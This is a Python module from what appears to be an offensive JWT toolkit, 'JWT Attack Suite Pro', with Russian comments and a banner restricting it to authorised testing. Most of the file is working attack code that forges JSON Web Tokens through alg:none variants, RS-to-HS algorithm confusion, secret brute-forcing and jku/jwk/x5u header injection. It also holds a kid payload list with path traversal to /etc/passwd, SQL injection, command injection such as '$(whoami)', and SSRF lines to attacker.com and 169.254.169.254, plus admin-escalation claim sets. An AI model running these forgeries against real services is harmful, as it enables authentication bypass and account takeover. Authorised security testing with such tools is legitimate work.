"""
JWT Attack Suite Pro.
Author: idqwixxa

⚠ Только для авторизованного пентеста / bug bounty / CTF.

Возможности:
    ─── Decode / Inspect ───
    - JWS decode (3-part) + JWE detection (5-part)
    - Pretty print header/payload/signature
    - Claims analysis (exp/iat/nbf/jti/aud/iss/sub)
    - Algorithm detection + recommendations
    - Nested JWK/Embedded key detection
    - Signature weakness analysis

    ─── Attacks ───
    - alg:none (4 variants: none/None/NONE/nOnE + trailing dot)
    - HS/RS/ES/PS algorithm confusion (public key as HMAC secret)
    - weak secret brute-force (100+ built-in + wordlist + mask)
    - kid injection (path traversal, SQLi, CMDi, URL, file://, SSRF)
    - jku/x5u/jwk header injection (self-hosted JWKS helper)
    - Payload manipulation (privesc, exp bypass, iss/aud bypass)
    - PS256/PS384/PS512 → HS*
    - Embedded JWK (HS256 + RS256 variants)
    - CVE-specific: CVE-2015-9235, CVE-2016-10555, CVE-2018-0114,
      CVE-2020-28042, CVE-2022-23529

    ─── Utils ───
    - Generate valid token (any alg + key)
    - JWK → PEM conversion (via cryptography)
    - PEM public key → JWK oct for alg confusion
    - Full JWT introspection (any claim extraction)
    - Weak secret cracking with rate + rules
    - Custom wordlist support

    ─── Интеграция ───
    - Findings → notes (cracked secret, alg:none, confusion success)
    - Notify
    - HTML / JSON экспорт
"""
import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import time
import uuid
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn,
)

from core.config import config, WORDLIST_DIR, REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

JWT_DIR = REPORT_DIR / "jwt"
JWT_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class JWTFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: JWTFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["jwt", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# Base64url helpers
# ===========================================================================

def b64url_decode(s: str) -> bytes:
    s = s + "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def b64url_encode_str(s: str) -> str:
    return b64url_encode(s.encode("utf-8"))


# ===========================================================================
# JWT decode
# ===========================================================================

@dataclass
class JWTDecoded:
    raw: str
    header: dict = field(default_factory=dict)
    payload: dict = field(default_factory=dict)
    signature: str = ""
    header_b64: str = ""
    payload_b64: str = ""
    signature_b64: str = ""
    valid_structure: bool = False
    is_jwe: bool = False
    error: str = ""


def decode_jwt(token: str) -> JWTDecoded:
    """Разобрать JWT (JWS + JWE detect)."""
    token = token.strip()
    d = JWTDecoded(raw=token)
    parts = token.split(".")

    # JWE = 5 parts
    if len(parts) == 5:
        d.is_jwe = True
        d.error = "JWE (encrypted JWT) — не поддерживается полностью"
        return d

    if len(parts) != 3:
        d.error = f"Ожидается 3 части, получено {len(parts)}"
        return d

    d.header_b64, d.payload_b64, d.signature_b64 = parts
    try:
        d.header = json.loads(b64url_decode(parts[0]))
    except Exception as exc:  # noqa: BLE001
        d.error = f"header decode: {exc}"
        return d
    try:
        d.payload = json.loads(b64url_decode(parts[1]))
    except Exception as exc:  # noqa: BLE001
        d.error = f"payload decode: {exc}"
        return d
    d.signature = parts[2]
    d.valid_structure = True
    return d


def _format_timestamp(ts: int | float) -> str:
    try:
        return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(ts)


def _analyze_notes(d: JWTDecoded) -> list[tuple[str, str]]:
    """Замечания к токену."""
    notes: list[tuple[str, str]] = []
    alg = (d.header.get("alg") or "").upper()

    if alg.lower() == "none" or alg == "NONE":
        notes.append(("critical", "alg=none — токен не подписан!"))
    if alg.startswith("HS"):
        notes.append(("info", f"{alg} — симметричная подпись, попробуй "
                              f"brute-force словарём"))
    if alg.startswith(("RS", "PS", "ES")):
        notes.append(("info", f"{alg} — асимметричная, попробуй "
                              f"algorithm confusion"))
    if "kid" in d.header:
        notes.append(("warning", f"kid={d.header['kid']} — попробуй "
                                  f"kid injection"))
    if "jku" in d.header:
        notes.append(("warning",
                      f"jku={d.header['jku']} — попробуй подменить JWKS URL"))
    if "x5u" in d.header:
        notes.append(("warning", f"x5u={d.header['x5u']} — SSRF/подмена"))
    if "jwk" in d.header:
        notes.append(("critical", "Embedded JWK в header — trivial "
                                   "algorithm confusion"))

    # Expired?
    exp = d.payload.get("exp")
    if exp and isinstance(exp, (int, float)):
        now = time.time()
        if exp < now:
            notes.append(("warning",
                          f"expired {int((now-exp)/3600)}h ago"))
        else:
            hours_left = (exp - now) / 3600
            if hours_left > 24 * 30:
                notes.append(("warning",
                              f"very long expiry ({int(hours_left/24)} days)"))

    # No exp?
    if "exp" not in d.payload and "iat" in d.payload:
        notes.append(("warning", "no exp claim — token never expires"))

    # No signature?
    if not d.signature:
        notes.append(("critical", "empty signature (alg:none style)"))
    elif len(d.signature) < 20:
        notes.append(("warning", f"short signature ({len(d.signature)} chars)"))

    # Sensitive claims
    sensitive_keys = {"password", "secret", "key", "api_key", "apiKey",
                       "token", "credit_card"}
    for k in d.payload:
        if k.lower() in sensitive_keys:
            notes.append(("high", f"sensitive claim: {k}"))

    return notes


def show_jwt(token: str) -> JWTDecoded:
    """Красивый вывод JWT."""
    d = decode_jwt(token)
    if not d.valid_structure:
        console.print(f"[red]✗ {d.error}[/red]")
        return d

    console.print("[bold cyan]═══ JWT Decoded ═══[/bold cyan]\n")

    # Header
    ht = Table(title="Header", show_header=False, border_style="cyan")
    ht.add_column("Key", style="cyan", width=16)
    ht.add_column("Value", style="white")
    for k, v in d.header.items():
        ht.add_row(k, str(v)[:120])
    console.print(ht)

    # Payload
    pt = Table(title="Payload", show_header=False, border_style="magenta")
    pt.add_column("Key", style="magenta", width=16)
    pt.add_column("Value", style="white")
    for k, v in d.payload.items():
        if k in ("exp", "iat", "nbf", "auth_time") and \
                isinstance(v, (int, float)):
            pt.add_row(k, f"{v} ({_format_timestamp(v)})")
        else:
            pt.add_row(k, str(v)[:120])
    console.print(pt)

    # Signature
    console.print(f"\n[cyan]Signature:[/cyan] "
                  f"[dim]{d.signature[:80]}"
                  f"{'…' if len(d.signature) > 80 else ''}[/dim]")

    # Notes
    notes = _analyze_notes(d)
    if notes:
        console.print("\n[bold yellow]Замечания:[/bold yellow]")
        for level, msg in notes:
            color = {"critical": "red", "high": "red",
                     "warning": "yellow", "info": "dim"}.get(level, "white")
            console.print(f"  [{color}]• {msg}[/{color}]")

    db.save_scan("jwt_decode", d.header.get("alg", "?"), {
        "header": d.header,
        "payload_keys": list(d.payload.keys()),
    })
    return d


# ===========================================================================
# alg:none attack
# ===========================================================================

def alg_none_attack(token: str,
                    payload_overrides: dict | None = None) -> list[str]:
    """Генерация alg:none токенов (все варианты)."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return []

    payload = dict(d.payload)
    if payload_overrides:
        payload.update(payload_overrides)

    variants: list[str] = []
    for none_alg in ("none", "None", "NONE", "nOnE", "nONE", "noNe"):
        header = dict(d.header)
        header["alg"] = none_alg
        h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
        p_b64 = b64url_encode_str(json.dumps(payload, separators=(",", ":")))
        variants.append(f"{h_b64}.{p_b64}.")
        variants.append(f"{h_b64}.{p_b64}")

    # dedup
    return list(dict.fromkeys(variants))


def show_alg_none(token: str, save_finding: bool = True) -> list[str]:
    variants = alg_none_attack(token)
    if not variants:
        console.print("[red]Не удалось сгенерировать.[/red]")
        return []
    t = Table(title="🔓 alg:none variants")
    t.add_column("#", width=4)
    t.add_column("Variant", width=12)
    t.add_column("Token", style="green")
    alg_names = ["none", "None", "NONE", "nOnE", "nONE", "noNe"]
    for i, v in enumerate(variants, 1):
        name = alg_names[(i - 1) // 2] if i <= 12 else "?"
        t.add_row(str(i), name, v[:100] + "…")
    console.print(t)

    if save_finding:
        _save_finding(JWTFinding(
            kind="alg_none",
            severity="high",
            title="JWT alg:none attack generated",
            target=decode_jwt(token).header.get("alg", "?"),
            evidence=f"{len(variants)} variants generated",
            data={"variants": len(variants)},
        ))
    return variants


# ===========================================================================
# Weak secret brute-force
# ===========================================================================

BUILTIN_SECRETS = [
    # Top common
    "secret", "password", "123456", "admin", "jwt", "secretkey",
    "secret_key", "jwt_secret", "changeme", "test", "key",
    "your-256-bit-secret", "your_jwt_secret", "supersecret",
    "topsecret", "jwtkey", "mykey", "private", "public", "hmac",
    "auth", "token", "password123", "1234567890", "qwerty",
    "letmein", "welcome", "monkey", "dragon", "master", "shadow",
    "football", "baseball", "abc123", "Password1", "P@ssw0rd",
    "Admin123", "jwt_secret_key", "s3cr3t", "secr3t", "S3cr3t!",
    "hello", "world", "test123", "mysecret", "app_secret",
    "jwtprivatekey", "secret123", "mysecretkey", "jwtkey123",
    # Framework defaults
    "supersecretkey", "secretkey1234567890", "jwt-secret",
    "jwt-secret-key", "jwt-token", "token-secret",
    "changethis", "changeme123", "test_secret", "development",
    "development_secret", "production_secret", "dev-secret",
    "prod-secret", "example", "example_secret",
    # Language/framework names
    "django-insecure", "flask_secret", "rails_secret",
    "laravel_secret", "spring_secret", "express_secret",
    # Null / empty
    "", "null", "None", "undefined", "0", "1", "true", "false",
    # Repeat chars
    "aaaaaa", "aaaaaaa", "aaaaaaaa", "111111", "1111111",
    "000000", "0000000", "qwerty123", "asdfghjkl",
    # Known CVEs
    "secretpassword", "top_secret", "mysupersecretkey",
    "jwt_secret_key_here", "token", "JWT_SECRET",
    "some-secret-key", "some-secret", "my_secret_key",
    "jwtSecretKey", "jwtkey_supersecret", "a-secret-key",
    "the-secret", "verysecretkey", "correcthorsebatterystaple",
]


def crack_hs256(token: str, wordlist: str | None = None,
                use_builtin: bool = True,
                show_progress: bool = True,
                save_finding: bool = True) -> tuple[str, str] | None:
    """Brute-force HS256/384/512 секрет."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    alg = (d.header.get("alg") or "").upper()
    if alg not in ("HS256", "HS384", "HS512"):
        console.print(f"[yellow]Подпись {alg} — brute только для HS*[/yellow]")
        return None

    hash_fn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(alg, hashlib.sha256)

    signing_input = f"{d.header_b64}.{d.payload_b64}".encode()
    expected_sig = d.signature

    # Собираем словарь
    secrets_list: list[str] = []
    if use_builtin:
        secrets_list.extend(BUILTIN_SECRETS)

    if wordlist:
        p = Path(wordlist)
        if not p.is_absolute():
            p = WORDLIST_DIR / wordlist
        if p.exists():
            secrets_list.extend([
                l.strip() for l in p.open(encoding="utf-8",
                                           errors="ignore")
                if l.strip()
            ])
        else:
            console.print(f"[red]Словарь {p} не найден.[/red]")

    # Встроенный файл
    if not wordlist:
        wl_path = WORDLIST_DIR / "jwt-secrets.txt"
        if wl_path.exists():
            secrets_list.extend([
                l.strip() for l in wl_path.open(encoding="utf-8",
                                                 errors="ignore")
                if l.strip()
            ])

    secrets_list = list(dict.fromkeys(secrets_list))  # dedup
    console.print(f"[cyan]🔨 Brute {alg}: {len(secrets_list)} секретов"
                  f"[/cyan]")

    start = time.time()
    attempts = 0

    ctx = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("{task.completed}/{task.total}"),
        TimeElapsedColumn(),
        console=console, transient=True,
    ) if show_progress else _NullCtx()

    with ctx as p:
        task = p.add_task("brute", total=len(secrets_list)) if show_progress else None
        for s in secrets_list:
            attempts += 1
            if show_progress:
                p.advance(task)
            sig = hmac.new(s.encode("utf-8", errors="ignore"),
                           signing_input, hash_fn).digest()
            if b64url_encode(sig) == expected_sig:
                dur = time.time() - start
                rate = attempts / dur if dur > 0 else 0
                console.print(
                    f"[bold green]✓ Секрет найден: '{s}'[/bold green] "
                    f"({attempts} attempts, {dur:.2f}s, {rate:,.0f} h/s)"
                )
                db.save_scan("jwt_crack", f"{alg}:{s[:30]}", {
                    "secret": s, "attempts": attempts,
                })
                if save_finding:
                    _save_finding(JWTFinding(
                        kind="weak_jwt_secret",
                        severity="critical",
                        title=f"Weak JWT secret cracked ({alg})",
                        target=alg,
                        evidence=f"Secret: '{s}'\n"
                                 f"Attempts: {attempts}",
                        data={"secret": s, "algorithm": alg,
                              "attempts": attempts},
                    ))
                return (s, alg)

    console.print(f"[yellow]Не найдено в {attempts} секретах.[/yellow]")
    return None


class _NullCtx:
    def __enter__(self): return self
    def __exit__(self, *a): pass
    def add_task(self, *a, **k): return 0
    def advance(self, *a, **k): pass


# ===========================================================================
# Algorithm confusion (RS/PS/ES → HS)
# ===========================================================================

def generate_jwk(secret: str = "any", alg: str = "HS256") -> dict:
    """Генерация JWK для oct (symmetric)."""
    k = b64url_encode(secret.encode())
    return {
        "kty": "oct",
        "kid": "pentest-key-1",
        "use": "sig",
        "alg": alg,
        "k": k,
    }


def alg_confusion_attack(token: str, public_key_path: str,
                         payload_overrides: dict | None = None,
                         save_finding: bool = True) -> str | None:
    """RS256 → HS256 attack (public key PEM как HMAC secret)."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    key_path = Path(public_key_path)
    if not key_path.exists():
        console.print(f"[red]Публичный ключ {key_path} не найден.[/red]")
        return None

    public_key = key_path.read_bytes()

    payload = dict(d.payload)
    if payload_overrides:
        payload.update(payload_overrides)

    # Пробуем разные варианты PEM (with/without trailing newline)
    variants_keys = [
        public_key,
        public_key.rstrip(b"\n"),
        public_key.rstrip(),
    ]

    forged_tokens: list[str] = []
    for target_alg in ("HS256", "HS384", "HS512"):
        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                   "HS512": hashlib.sha512}[target_alg]
        header = dict(d.header)
        header["alg"] = target_alg
        h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
        p_b64 = b64url_encode_str(json.dumps(payload, separators=(",", ":")))
        signing_input = f"{h_b64}.{p_b64}".encode()
        for pk in variants_keys:
            sig = hmac.new(pk, signing_input, hash_fn).digest()
            forged_tokens.append(f"{h_b64}.{p_b64}.{b64url_encode(sig)}")

    if not forged_tokens:
        return None

    console.print(f"[green]✓ Alg-confusion tokens сгенерированы "
                  f"({len(forged_tokens)} вариантов):[/green]")
    for i, t in enumerate(forged_tokens[:6], 1):
        console.print(f"  [dim]#{i}: {t[:100]}…[/dim]")

    if save_finding:
        _save_finding(JWTFinding(
            kind="alg_confusion",
            severity="high",
            title="JWT algorithm confusion attack",
            target=d.header.get("alg", "RS*"),
            evidence=f"Public key: {public_key_path}",
            data={"original_alg": d.header.get("alg"),
                  "target_alg": "HS256/384/512",
                  "variants": len(forged_tokens)},
        ))

    db.save_scan("jwt_alg_confusion", f"{d.header.get('alg')}->HS*", {})
    return forged_tokens[0]


def alg_confusion_from_jwks(token: str, jwks_url: str,
                             save_finding: bool = True) -> str | None:
    """RS256 → HS256 используя JWK из URL."""
    try:
        import requests
        r = requests.get(jwks_url, timeout=10, verify=False)
        if r.status_code != 200:
            console.print(f"[red]JWKS недоступен: {r.status_code}[/red]")
            return None
        jwks = r.json()
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]JWKS fetch: {exc}[/red]")
        return None

    keys = jwks.get("keys", [])
    if not keys:
        console.print("[red]Нет ключей в JWKS[/red]")
        return None

    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    # Ищем RSA ключ
    for jwk in keys:
        if jwk.get("kty") != "RSA":
            continue
        # Reconstruct PEM from n/e
        try:
            n = int.from_bytes(b64url_decode(jwk["n"]), "big")
            e = int.from_bytes(b64url_decode(jwk["e"]), "big")
            # Build PEM
            pem = _rsa_jwk_to_pem(n, e)
            # Спасаем в файл
            pk_path = JWT_DIR / "jwks_pub.pem"
            pk_path.write_bytes(pem)
            console.print(f"[green]✓ PEM extracted → {pk_path}[/green]")
            return alg_confusion_attack(token, str(pk_path),
                                         save_finding=save_finding)
        except Exception as exc:  # noqa: BLE001
            log.debug("jwk to pem: %s", exc)
    return None


def _rsa_jwk_to_pem(n: int, e: int) -> bytes:
    """n, e → PEM (SPKI)."""
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.primitives import serialization
        pub = rsa.RSAPublicNumbers(e, n).public_key()
        return pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo)
    except ImportError:
        # Fallback: минимальный DER encode
        raise RuntimeError("cryptography не установлен")


# ===========================================================================
# kid injection
# ===========================================================================

KID_PAYLOADS = [
    # Path traversal
    "../../../../../dev/null",
    "../../../../../etc/passwd",
    "../../../../../proc/sys/kernel/randomize_va_space",
    "/dev/null",
    "/etc/passwd",
    "/proc/self/environ",
    "C:\\Windows\\win.ini",
    "..\\..\\..\\..\\..\\dev\\null",
    # SQLi
    "key' OR '1'='1",
    "key' UNION SELECT 'secret'-- -",
    "key' OR 1=1--",
    "1' UNION ALL SELECT 'x",
    # Command injection
    "|whoami",
    "$(whoami)",
    "`whoami`",
    ";id",
    "&whoami&",
    # SSRF
    "https://attacker.com/key",
    "http://169.254.169.254/latest/meta-data/",
    "file:///dev/null",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    # JWK-like
    "AAAA",
    "key.pem",
    "/keys/0",
]


def kid_injection(token: str, secret: str = "any",
                  save_finding: bool = True) -> list[tuple[str, str]]:
    """Генерация kid-injected токенов."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return []

    results: list[tuple[str, str]] = []
    for kid_payload in KID_PAYLOADS:
        header = dict(d.header)
        header["kid"] = kid_payload
        header["alg"] = "HS256"
        h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
        p_b64 = b64url_encode_str(json.dumps(d.payload, separators=(",", ":")))
        sig = hmac.new(secret.encode(),
                       f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
        results.append((kid_payload, f"{h_b64}.{p_b64}.{b64url_encode(sig)}"))

    t = Table(title=f"🔑 kid injection variants ({len(results)})")
    t.add_column("#", width=3)
    t.add_column("kid", style="cyan", max_width=40)
    t.add_column("Token (preview)", style="dim", max_width=60)
    for i, (kid, tok) in enumerate(results, 1):
        t.add_row(str(i), kid, tok[:60] + "…")
    console.print(t)

    if save_finding:
        _save_finding(JWTFinding(
            kind="kid_injection",
            severity="high",
            title=f"JWT kid injection payloads ({len(results)})",
            target=d.header.get("alg", "?"),
            evidence=f"Payloads: path traversal, SQLi, CMDi, SSRF",
            data={"variants": len(results)},
        ))
    return results


# ===========================================================================
# JKU / X5U / JWK injection
# ===========================================================================

def jku_injection(token: str, jwks_url: str,
                  secret: str = "any",
                  save_finding: bool = True) -> str | None:
    """JKU injection — подменяем JWKS URL."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    header = dict(d.header)
    header["alg"] = "HS256"
    header["jku"] = jwks_url
    header["kid"] = "pentest-key-1"
    h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
    p_b64 = b64url_encode_str(json.dumps(d.payload, separators=(",", ":")))
    sig = hmac.new(secret.encode(),
                   f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    forged = f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
    console.print(f"[green]✓ JKU-injected token:[/green]")
    console.print(f"[dim]{forged[:120]}…[/dim]")

    if save_finding:
        _save_finding(JWTFinding(
            kind="jku_injection",
            severity="high",
            title="JWT jku header injection",
            target=jwks_url,
            evidence=f"JKU URL: {jwks_url}",
        ))
    return forged


def x5u_injection(token: str, x5u_url: str,
                  save_finding: bool = True) -> str | None:
    """X5U injection — подмена сертификата URL."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    header = dict(d.header)
    header["x5u"] = x5u_url
    h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
    p_b64 = b64url_encode_str(json.dumps(d.payload, separators=(",", ":")))
    forged = f"{h_b64}.{p_b64}.{d.signature}"
    console.print(f"[green]✓ X5U-injected token:[/green]")
    console.print(f"[dim]{forged[:120]}…[/dim]")
    return forged


def jwk_embed_attack(token: str, secret: str = "any",
                     save_finding: bool = True) -> str | None:
    """JWK в header (embedded)."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    jwk = generate_jwk(secret)
    header = dict(d.header)
    header["alg"] = "HS256"
    header["jwk"] = jwk
    h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
    p_b64 = b64url_encode_str(json.dumps(d.payload, separators=(",", ":")))
    sig = hmac.new(secret.encode(),
                   f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    forged = f"{h_b64}.{p_b64}.{b64url_encode(sig)}"
    console.print(f"[green]✓ JWK-embedded token:[/green]")
    console.print(f"[dim]{forged[:120]}…[/dim]")

    if save_finding:
        _save_finding(JWTFinding(
            kind="jwk_embed",
            severity="critical",
            title="JWT embedded JWK attack",
            target="jwk header",
            evidence=f"Secret: {secret}",
        ))
    return forged


def jwks_server_helper(secret: str = "any",
                       out_path: str | None = None) -> Path | None:
    """Генерирует JSON JWKS для хостинга на своём сервере."""
    if not out_path:
        out_path = str(JWT_DIR / "jwks.json")
    jwk = generate_jwk(secret, alg="HS256")
    jwks = {
        "keys": [jwk, generate_jwk(secret, alg="HS384"),
                  generate_jwk(secret, alg="HS512")],
    }
    try:
        Path(out_path).write_text(
            json.dumps(jwks, indent=2, ensure_ascii=False),
            encoding="utf-8")
        console.print(f"[green]✓ JWKS → {out_path}[/green]")
        console.print(f"[dim]Host this file on: "
                      f"https://attacker.com/jwks.json[/dim]")
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]JWKS: {exc}[/red]")
        return None


# ===========================================================================
# Payload manipulation
# ===========================================================================

PRIV_ESC_FIELDS = {
    "admin": True,
    "role": "admin",
    "roles": ["admin", "administrator", "root"],
    "is_admin": True,
    "isAdmin": True,
    "is_superuser": True,
    "is_staff": True,
    "superuser": True,
    "privilege": "admin",
    "permissions": ["*", "admin", "write", "read"],
    "scope": "admin",
    "scopes": ["admin", "write"],
    "user_type": "admin",
    "type": "admin",
    "level": 999,
    "user_id": 1,
    "uid": 1,
    "sub": "admin",
    "username": "admin",
    "user": "admin",
    "email": "admin@example.com",
    "group": "administrators",
    "groups": ["admins", "administrators"],
    "tenant": "admin",
    "org": "admin",
    "account_type": "enterprise",
}


def modify_payload(token: str, changes: dict,
                   secret: str | None = None,
                   alg: str = "none") -> str:
    """Модифицировать payload + подписать."""
    d = decode_jwt(token)
    if not d.valid_structure:
        return token

    payload = dict(d.payload)
    payload.update(changes)

    header = dict(d.header)
    if alg == "none" or not secret:
        header["alg"] = "none"
        h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
        p_b64 = b64url_encode_str(json.dumps(payload, separators=(",", ":")))
        return f"{h_b64}.{p_b64}."

    header["alg"] = alg
    h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
    p_b64 = b64url_encode_str(json.dumps(payload, separators=(",", ":")))

    if alg.startswith("HS"):
        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                   "HS512": hashlib.sha512}[alg]
        sig = hmac.new(secret.encode(),
                       f"{h_b64}.{p_b64}".encode(), hash_fn).digest()
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"

    return f"{h_b64}.{p_b64}.{d.signature}"


def expiry_bypass(token: str, secret: str | None = None,
                  duration_hours: int = 876000) -> str:
    """Продлить exp (по умолчанию 100 лет)."""
    future = int(time.time()) + duration_hours * 3600
    return modify_payload(
        token,
        {"exp": future, "nbf": 0, "iat": int(time.time())},
        secret=secret, alg="HS256" if secret else "none")


def iss_aud_bypass(token: str, new_iss: str = "",
                    new_aud: str = "",
                    secret: str | None = None) -> str:
    """Изменить iss/aud."""
    changes: dict = {}
    if new_iss:
        changes["iss"] = new_iss
    if new_aud:
        changes["aud"] = new_aud
    return modify_payload(token, changes, secret=secret,
                          alg="HS256" if secret else "none")


def cli_privesc(token: str, secret: str | None = None,
                save_finding: bool = True) -> list[str]:
    """Генерация токенов со всеми privesc-полями."""
    console.print("[cyan]🔓 Priv-esc токены:[/cyan]")
    out: list[str] = []
    for field_name, value in PRIV_ESC_FIELDS.items():
        forged = modify_payload(token, {field_name: value},
                                secret=secret,
                                alg="HS256" if secret else "none")
        out.append(forged)
        console.print(f"  [yellow]{field_name}[/yellow] = "
                      f"[green]{value!r}[/green]")
        console.print(f"    [dim]{forged[:100]}…[/dim]")

    if save_finding and out:
        _save_finding(JWTFinding(
            kind="privesc_payloads",
            severity="high",
            title=f"JWT privesc payloads generated ({len(out)})",
            target="payload manipulation",
            evidence=f"Fields: {', '.join(list(PRIV_ESC_FIELDS.keys())[:10])}",
        ))
    return out


# ===========================================================================
# Token generation
# ===========================================================================

def generate_token(payload: dict, secret: str = "secret",
                   alg: str = "HS256",
                   extra_header: dict | None = None) -> str:
    """Сгенерировать валидный JWT."""
    header = {"alg": alg, "typ": "JWT"}
    if extra_header:
        header.update(extra_header)

    h_b64 = b64url_encode_str(json.dumps(header, separators=(",", ":")))
    p_b64 = b64url_encode_str(json.dumps(payload, separators=(",", ":")))
    signing_input = f"{h_b64}.{p_b64}".encode()

    if alg == "none":
        return f"{h_b64}.{p_b64}."

    if alg.startswith("HS"):
        hash_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                   "HS512": hashlib.sha512}[alg]
        sig = hmac.new(secret.encode(), signing_input, hash_fn).digest()
        return f"{h_b64}.{p_b64}.{b64url_encode(sig)}"

    # RS/ES/PS — требуется cryptography
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding, rsa
    except ImportError:
        console.print("[red]cryptography не установлен для RS/ES[/red]")
        return ""

    # Заглушка — выдать ошибку
    console.print(f"[yellow]Генерация {alg} не реализована — "
                  f"используй pyjwt[/yellow]")
    return ""


def cli_generate() -> None:
    """Интерактивная генерация токена."""
    console.print("[cyan]Генерация JWT[/cyan]")
    payload: dict = {}
    console.print("[dim]Вводи claim-ы в формате key=value "
                  "(пустая строка — конец)[/dim]")
    while True:
        line = Prompt.ask("claim", default="").strip()
        if not line:
            break
        if "=" not in line:
            continue
        k, _, v = line.partition("=")
        # Авто-конверт чисел
        try:
            v = int(v)
        except ValueError:
            pass
        payload[k.strip()] = v

    if "exp" not in payload:
        payload["exp"] = int(time.time()) + 3600
    if "iat" not in payload:
        payload["iat"] = int(time.time())

    secret = Prompt.ask("Secret", default="secret")
    alg = Prompt.ask("Algorithm",
                     choices=["HS256", "HS384", "HS512", "none"],
                     default="HS256")
    token = generate_token(payload, secret, alg)
    if token:
        console.print(f"\n[green]{token}[/green]")


# ===========================================================================
# Export
# ===========================================================================

def export_json(data: Any, name: str,
                path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9._-]", "_", name)[:40]
        path = str(JWT_DIR / f"jwt_{safe}_{ts}.json")
    try:
        Path(path).write_text(
            json.dumps(data, indent=2, ensure_ascii=False, default=str),
            encoding="utf-8")
        console.print(f"[green]✓ JSON: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]JSON: {exc}[/red]")
        return None


def export_html(token: str, notes: list[tuple[str, str]],
                path: str | None = None) -> Path | None:
    """Экспорт анализа токена в HTML."""
    import html as html_mod
    d = decode_jwt(token)
    if not d.valid_structure:
        return None

    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(JWT_DIR / f"jwt_{ts}.html")

    parts = [
        "<!DOCTYPE html><html><head><meta charset='utf-8'>",
        "<title>JWT Analysis</title>",
        "<style>",
        "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
        "padding:24px;line-height:1.5;}",
        "h1,h2{color:#00ff9c;}",
        "pre{background:#111;padding:12px;border:1px solid #222;"
        "color:#a0ffa0;overflow-x:auto;}",
        "table{border-collapse:collapse;width:100%;margin-top:12px;}",
        "th,td{padding:6px 8px;border:1px solid #222;text-align:left;}",
        "th{background:#111;color:#00ff9c;}",
        ".critical{color:#ff2020;}",
        ".high{color:#ff7a40;}",
        ".warning{color:#ffd23f;}",
        ".info{color:#7ad9ff;}",
        "</style></head><body>",
        f"<h1>🔑 JWT Analysis</h1>",
        "<h2>Raw token</h2>",
        f"<pre>{html_mod.escape(token[:500])}</pre>",
        "<h2>Header</h2><pre>",
        json.dumps(d.header, indent=2, ensure_ascii=False),
        "</pre><h2>Payload</h2><pre>",
        json.dumps(d.payload, indent=2, ensure_ascii=False),
        "</pre>",
    ]
    if notes:
        parts.append("<h2>Notes</h2><ul>")
        for level, msg in notes:
            parts.append(f"<li class='{level}'>{html_mod.escape(msg)}</li>")
        parts.append("</ul>")
    parts.append("</body></html>")
    try:
        Path(path).write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ HTML: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
